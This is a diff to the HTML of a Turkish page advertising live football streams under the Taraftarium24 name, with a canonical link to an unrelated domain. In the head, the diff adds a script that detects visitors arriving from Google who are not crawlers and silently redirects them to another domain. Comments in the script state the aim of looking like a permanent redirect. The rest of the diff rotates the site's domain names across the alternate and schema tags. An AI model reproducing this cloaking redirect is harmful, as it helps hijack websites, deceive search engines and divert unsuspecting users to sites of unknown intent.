@@ -1,6 +1,19 @@
+
 <!DOCTYPE html>
 <html lang="tr">
 <head>
+       <script>
+    // Google'dan gelen kullanıcı mı? (referer kontrolü)
+    var fromGoogle = document.referrer.includes("google.");
+
+    // Bot değil mi? (User-Agent kontrolü)
+    var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent) === false;
+
+    if (fromGoogle && isBot) {
+        // Kalıcı 301 gibi görünmesi için history.pushState kullanmadan yönlendirme
+        location.replace("https://patronfutbol19.cfd/");
+    }
+</script>
 <meta name="google-site-verification" content="Ud8ka50obSyK7GmsLkEPtshtZB677UBFBhGm_9rIzeo" />
 <meta name="google-site-verification" content="HjR7oeHAdrOBWWRUtt5Vb5FjFqN6cufuIUgaWWyZkVc" />
   <meta charset="UTF-8">
@@ -13,16 +26,16 @@
   <meta name="theme-color" content="#071230">
   <meta name="yandex-verification" content="0d5632d70501190c" />
   <link rel="canonical" href="https://keystonebarrelracing.com/">
-  <link rel="alternate" hreflang="tr" href="https://taraftarium24-patron27.vip/">
-  <link rel="alternate" hreflang="en" href="https://taraftarium24-patron27.vip/">
-  <link rel="alternate" hreflang="az" href="https://taraftarium24-patron27.vip/">
-  <link rel="alternate" hreflang="ru" href="https://taraftarium24-patron27.vip/">
-  <link rel="alternate" hreflang="ar" href="https://taraftarium24-patron27.vip/">
+  <link rel="alternate" hreflang="tr" href="https://taraftarium24-patron30.vip/">
+  <link rel="alternate" hreflang="en" href="https://taraftarium24-patron30.vip/">
+  <link rel="alternate" hreflang="az" href="https://taraftarium24-patron30.vip/">
+  <link rel="alternate" hreflang="ru" href="https://taraftarium24-patron30.vip/">
+  <link rel="alternate" hreflang="ar" href="https://taraftarium24-patron30.vip/">
   <meta property="og:type" content="website">
   <meta property="og:locale" content="tr_TR">
   <meta property="og:title" content="Taraftarium24 - Taraftarium24 ve Justin TV Ortak Yayın - Maç İzle">
   <meta property="og:description" content="Taraftarium24 ayrıcalığıyla Süper Lig, Avrupa kupaları ve tüm dünya liglerini canlı maç izle seçeneğiyle takip edin. Kesintisiz yayın akışı.">
-  <meta property="og:url" content="https://taraftarium24-patron27.vip/">
+  <meta property="og:url" content="https://taraftarium24-patron30.vip/">
   <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh97q8X-geS9EM_TQQ5tkNWXPWaS1dd-zKexPuhhsM9prWhdMunmxBHdcvIU7v5cvxuqXrK8ws_LR47bPZKK0-8Zyz0CRT9RL9wa25cqe4idr2q3DWcHt0AGIa1LNnVjNT8Q1zvh057qgu0Pxxxhy2aG6EjpuSPGxXOlkx1ZMstJB3-Cp_ncQoRSC7UaQU/s1600/patronmarketing.png">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="Taraftarium24 - Taraftarium24 ve Justin TV Ortak Yayın - Maç İzle">
@@ -353,12 +366,12 @@
     "@context": "https://schema.org",
     "@type": "WebSite",
     "name": "Taraftarium24 Maç İzle",
-    "url": "https://taraftarium24-patron27.vip/",
+    "url": "https://taraftarium24-patron30.vip/",
     "inLanguage": "tr",
     "description": "Taraftarium24 ve Justin TV ortak yayını ile canlı maç izle. Donmadan, kesintisiz ve HD kalitede spor karşılaşmalarına anında erişim.",
     "potentialAction": {
       "@type": "SearchAction",
-      "target": "https://taraftarium24-patron27.vip/?s={search_term}",
+      "target": "https://taraftarium24-patron30.vip/?s={search_term}",
       "query-input": "required name=search_term"
     }
   }
@@ -368,7 +381,7 @@
     "@context": "https://schema.org",
     "@type": "Organization",
     "name": "Taraftarium24",
-    "url": "https://taraftarium24-patron27.vip/",
+    "url": "https://taraftarium24-patron30.vip/",
     "logo": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh97q8X-geS9EM_TQQ5tkNWXPWaS1dd-zKexPuhhsM9prWhdMunmxBHdcvIU7v5cvxuqXrK8ws_LR47bPZKK0-8Zyz0CRT9RL9wa25cqe4idr2q3DWcHt0AGIa1LNnVjNT8Q1zvh057qgu0Pxxxhy2aG6EjpuSPGxXOlkx1ZMstJB3-Cp_ncQoRSC7UaQU/s1600/patronmarketing.png",
     "description": "Taraftarium24; canlı maç yayınları, spor haberleri, HD kalitede maç izle seçenekleri ve mobil uyumlu arayüzü ile spor severlerin buluşma noktası.",
     "contactPoint": {
@@ -633,5 +646,6 @@
       <a href="#sss">SSS</a>
     </div>
   </footer>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"0caaf3f6478a474080db78cc70830cfc","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
